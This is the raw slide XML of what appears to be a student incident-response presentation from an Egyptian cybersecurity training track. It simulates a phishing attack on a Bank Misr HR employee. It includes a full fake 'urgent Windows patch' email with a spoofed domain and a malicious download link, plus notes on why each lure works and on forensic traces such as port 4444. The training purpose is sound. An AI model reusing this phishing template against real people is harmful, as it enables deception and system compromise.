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1" r:id="rId3"/>
    <p:sldId id="272" r:id="rId4"/>
    <p:sldId id="273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05" autoAdjust="0"/>
    <p:restoredTop sz="93925" autoAdjust="0"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr snapToGrid="0" snapToObjects="1">
      <p:cViewPr>
        <p:scale>
          <a:sx n="50" d="100"/>
          <a:sy n="50" d="100"/>
        </p:scale>
        <p:origin x="1358" y="59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79565-F710-412A-9044-7FEEC06147C2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18D1A-27EA-44FD-B028-0FDB166DE1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663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118D1A-27EA-44FD-B028-0FDB166DE13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909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118D1A-27EA-44FD-B028-0FDB166DE13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6349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0" y="1097280"/>
            <a:ext cx="2926080" cy="3364991"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 133333"/>
            </a:avLst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22208" y="1682496"/>
            <a:ext cx="3803904" cy="2048255"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 133333"/>
            </a:avLst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-731520" y="3200400"/>
            <a:ext cx="2560320" cy="2944368"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 133333"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="008CB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115568" y="3712463"/>
            <a:ext cx="3328415" cy="1792223"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 133333"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="008CB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0" y="45720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46919" y="45720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966959" y="45720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87000" y="45720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07040" y="45720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26880" y="77724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46919" y="77724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966959" y="77724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287000" y="77724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07040" y="77724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0" y="109728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46919" y="109728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966959" y="109728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287000" y="109728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607040" y="109728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326880" y="1417319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46919" y="1417319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966959" y="1417319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287000" y="1417319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607040" y="1417319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326880" y="173736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646919" y="173736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966959" y="173736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287000" y="173736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607040" y="173736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326880" y="205740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646919" y="205740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966959" y="205740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287000" y="205740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607040" y="2057400"/>
            <a:ext cx="54864" cy="54864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74320" y="502920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94359" y="502920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14400" y="502920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234439" y="502920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74320" y="534924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94359" y="534924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14400" y="534924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234439" y="534924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74320" y="566928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94359" y="566928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14400" y="566928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234439" y="566928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57200" y="1188720"/>
            <a:ext cx="64008" cy="3108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" y="1115568"/>
            <a:ext cx="1737360" cy="347472"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8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1520" y="11155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F1F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>DEPI 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1572768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INCIDENT RESPONSE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26974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 dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00D4FF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>SIMULATION &amp; PLAN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160520"/>
            <a:ext cx="868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D0E8FF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Digital Egypt Pioneers Initiative  |  Cybersecurity Track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4846320"/>
            <a:ext cx="3063240" cy="160020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270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546478" y="4965079"/>
            <a:ext cx="12801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3D57"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>ATTACK SIDE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9844" y="5528973"/>
            <a:ext cx="23425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D0E8FF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Kali Linux  -&gt;  Windows 10</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="62" name="Oval 61"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="896112" y="5833872"/>
            <a:ext cx="64008" cy="64008"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF3D5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97280" y="5833872"/>
            <a:ext cx="64008" cy="64008"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF3D5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298448" y="5833872"/>
            <a:ext cx="64008" cy="64008"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF3D5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499616" y="5833872"/>
            <a:ext cx="64008" cy="64008"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF3D5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069080" y="4846320"/>
            <a:ext cx="3063240" cy="160020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18161" y="4984101"/>
            <a:ext cx="16279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D4FF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>IR FRAMEWORK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06134" y="5523976"/>
            <a:ext cx="2188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D0E8FF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>5 Phases  |  19 Steps</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="70" name="Oval 69"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4233672" y="5833872"/>
            <a:ext cx="64008" cy="64008"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse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4434840" y="5833872"/>
            <a:ext cx="64008" cy="64008"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse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4636008" y="5833872"/>
            <a:ext cx="64008" cy="64008"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse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837176" y="5833872"/>
            <a:ext cx="64008" cy="64008"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse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406640" y="4846320"/>
            <a:ext cx="3063240" cy="160020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270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304894" y="4981856"/>
            <a:ext cx="12301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E57A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>FORENSICS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99830" y="5512547"/>
            <a:ext cx="2240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D0E8FF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Evidence &amp; Reporting</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="78" name="Oval 77"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7571231" y="5833872"/>
            <a:ext cx="64008" cy="64008"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00E57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772400" y="5833872"/>
            <a:ext cx="64008" cy="64008"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00E57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7973567" y="5833872"/>
            <a:ext cx="64008" cy="64008"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00E57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74736" y="5833872"/>
            <a:ext cx="64008" cy="64008"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00E57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346078" y="42062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080A8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Amr  |  Omar  |  Martina  |  Mariam  |  Adham  |  Mostafa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GlowOval"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8000000" y="2000000"/>
            <a:ext cx="5000000" cy="5000000"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="3A0060">
              <a:alpha val="8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Label"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="18288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SCENARIO OVERVIEW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57200" y="548640"/>
            <a:ext cx="112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Attack Scenario</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="CardLeft"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="365760" y="1400000"/>
            <a:ext cx="3600000" cy="5000000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 30000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0E2244"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="00D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ardLeftText"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="765760" y="1860427"/>
            <a:ext cx="3350000" cy="48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 dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00D4FF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>SETUP</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFA000"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Company</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CCE8FF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Bank Misr (Egyptian bank)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFA000"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Victim</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CCE8FF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>HR department employee</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFA000"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Attacker Goal</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CCE8FF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Full remote access to internal workstation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFA000"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Method</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CCE8FF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Phishing email + fake Windows update page</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="CardRight"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4200000" y="1400000"/>
            <a:ext cx="7620000" cy="5000000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 30000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0E2244"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="B460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CardRightText"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4834957" y="1860427"/>
            <a:ext cx="6476217" cy="48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 dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B460FF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>WHY THIS MATTERS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF3D57"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Layer 1 — The Human Failure</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CCE8FF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>The employee did everything “right” — responded to an official-looking IT notice. The attack bypassed the human, not the technology.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFA000"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Layer 2 — The Technical Trail</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CCE8FF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Despite stealth — hidden PS window, process migration — the attacker left a clear forensic trail: port 4444 in netstat, Event ID 4624, and SHA256 hash as the IoC.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00E57A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Layer 3 — The Lesson</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CCE8FF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Active Defender + one email awareness training would have stopped this entirely. One technical control + one human control = full prevention.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Label"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="18288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SOCIAL ENGINEERING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548640"/>
            <a:ext cx="112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Phishing Email</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="EmailBox"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="365760" y="1370000"/>
            <a:ext cx="7200000" cy="5100000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 20000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0A1828"/>
          </a:solidFill>
          <a:ln w="15240">
            <a:solidFill>
              <a:srgbClr val="FF3D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EmailHeader"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="365760" y="1370000"/>
            <a:ext cx="7200000" cy="320000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 10000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A0A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EmailHeaderText"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="500000" y="1385000"/>
            <a:ext cx="6900000" cy="29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 dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF3D57"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>From: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFA000"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>it-support@bankmisrupdate.com</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="888888"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>    To: hr.staff@bankmsr.com</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="EmailSubject"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="500000" y="1961820"/>
            <a:ext cx="69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 dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Subject: [URGENT] Mandatory Windows Security Patch — Action Required Today</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="EmailBody"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="515760" y="2277500"/>
            <a:ext cx="6900000" cy="42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dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CCE8FF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Dear Valued Employee,</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CCE8FF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Our security team has detected that your workstation is missing Critical Security Update KB5034441, which patches a remote code execution vulnerability </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1050" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF3D57"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>(CVE-2024-21338)</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CCE8FF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> currently being actively exploited against Egyptian financial institutions.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1050" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF3D57"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Failure to install this patch before 5:00 PM today may result in your account being temporarily suspended</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CCE8FF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> per IT Security Policy 4.2.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CCE8FF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Please download and install the patch immediately:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1050" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00D4FF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>http://192.168.1.10/SecurityUpdate.exe</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1050" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="888888"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>This is an automated security notice. Do not reply to this email.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CCE8FF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>IT Security Team | Bank Misr</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="WhyBox"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7800000" y="1370000"/>
            <a:ext cx="4020000" cy="5100000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 20000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0E2244"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="FFA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WhyText"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8019801" y="1958000"/>
            <a:ext cx="3750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 dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFA000"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>WHY IT WORKS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1050" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF3D57"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Creates Urgency</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CCE8FF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>5:00 PM deadline forces fast action without thinking</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1050" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF3D57"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Threatens Consequences</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CCE8FF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Account suspension pushes the victim to comply immediately</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1050" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF3D57"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Looks Legitimate</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CCE8FF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Real CVE number + IT policy reference = trusted source</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1050" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF3D57"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Spoofed Domain</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CCE8FF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>bankmisrupdate.com vs bankmsr.com</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="900" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="888888"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>One letter difference — easy to miss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Label"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="18288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ATTACK FLOW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548640"/>
            <a:ext cx="112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From Email to Full Shell Access</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Step1Bg"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="365760" y="1400000"/>
            <a:ext cx="1600000" cy="700000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 30000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0E2244"/>
          </a:solidFill>
          <a:ln w="15240">
            <a:solidFill>
              <a:srgbClr val="FF3D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tep1Text"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="400000" y="1430000"/>
            <a:ext cx="1530000" cy="6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 dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF3D57"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>1</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Phishing email sent to victim</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Arr1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2000000" y="1720000"/>
            <a:ext cx="400000" cy="800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Step2Bg"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2450000" y="1400000"/>
            <a:ext cx="1600000" cy="700000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 30000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0E2244"/>
          </a:solidFill>
          <a:ln w="15240">
            <a:solidFill>
              <a:srgbClr val="FFA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tep2Text"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2490000" y="1430000"/>
            <a:ext cx="1520000" cy="6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 dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFA000"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>2</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Victim opens fake update page</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Arr2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4090000" y="1720000"/>
            <a:ext cx="400000" cy="800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Step3Bg"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4530000" y="1400000"/>
            <a:ext cx="1700000" cy="700000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 30000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0E2244"/>
          </a:solidFill>
          <a:ln w="15240">
            <a:solidFill>
              <a:srgbClr val="B460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tep3Text"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4570000" y="1430000"/>
            <a:ext cx="1620000" cy="6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>
                <a:solidFill>
                  <a:srgbClr val="B460FF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>3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SecurityUpdate.exe auto-downloads</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Arr3"/>
